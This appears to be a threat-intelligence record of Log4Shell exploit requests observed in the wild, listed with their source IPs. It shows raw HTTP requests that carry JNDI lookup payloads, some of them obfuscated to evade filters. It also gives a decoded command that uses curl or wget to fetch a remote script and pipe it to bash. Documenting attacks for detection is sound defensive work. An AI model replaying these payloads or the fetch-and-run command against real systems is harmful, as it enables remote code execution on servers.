```
GET / HTTP/1.1
Host: !!IP_ADDRESS!!
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: ${jndi:ldap://log4shell.huntress.com:1389/4ac61c12-0c8c-4552-95f0-dfa4053b4577}
Referer: ${jndi:ldap://log4shell.huntress.com:1389/4ac61c12-0c8c-4552-95f0-dfa4053b4577}
```

Source IPs:
- 36.72.216.81

-------------------------------------------------------------------------------------------
```
GET / HTTP/1.1
Host: !!IP_ADDRESS!!
User-Agent: ${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}
Accept: */*
Accept-Encoding: gzip
```

Kryptos scanners
Source IPs:
- 139.59.101.242

-----------------------------------------------------------------------------------------
```
GET / HTTP/1.1
Authorization: Oauth ${jndi:ldap://45.83.193.150:1389/Exploit}
User-Agent: curl/7.58.0
Accept: */*
Host: !!IP_ADDRESS!!
```

Source IPs:
- 221.226.159.22
- 218.89.222.71
- 1.179.247.182

-----------------------------------------------------------------------------------------
```
GET / HTTP/1.1
Authorization: Token ${jndi:ldap://45.83.193.150:1389/Exploit}
User-Agent: curl/7.58.0
Accept: */*
Host: !!IP_ADDRESS!!
```

Source IPs:
- 221.226.159.22
- 218.89.222.71
- 1.179.247.182

-----------------------------------------------------------------------------------------
```
GET / HTTP/1.1
Authorization: Basic ${jndi:ldap://45.83.193.150:1389/Exploit}
User-Agent: curl/7.58.0
Accept: */*
Host: !!IP_ADDRESS!!
```

Source IPs:
- 221.226.159.22
- 218.89.222.71
- 1.179.247.182

-----------------------------------------------------------------------------------------
```
GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1
Host: !!IP_ADDRESS!!
User-Agent: ${jndi:dns://45.83.64.1/securityscan-http80}
Referer: ${jndi:dns://45.83.64.1/securityscan-http80}
X-Api-Version: ${jndi:dns://45.83.64.1/securityscan-http80}
Accept-Encoding: gzip
```

Source IPs:
- 45.83.64.161

-----------------------------------------------------------------------------------------
```
GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/!!BASE64_VALUE!!} HTTP/1.1
Host: !!IP_ADDRESS!!:80
User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/!!BASE64_VALUE!!}
Referer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/!!BASE64_VALUE!!}
Accept-Encoding: gzip
Connection: close
```

Base64 value decodes to:

```bash
(curl -s 195.54.160.149:5874/!!IP_ADDRESS!!:80||wget -q -O- 195.54.160.149:5874/!!IP_ADDRESS!!:80)|bash
```

Source IPs:
- 195.54.160.149
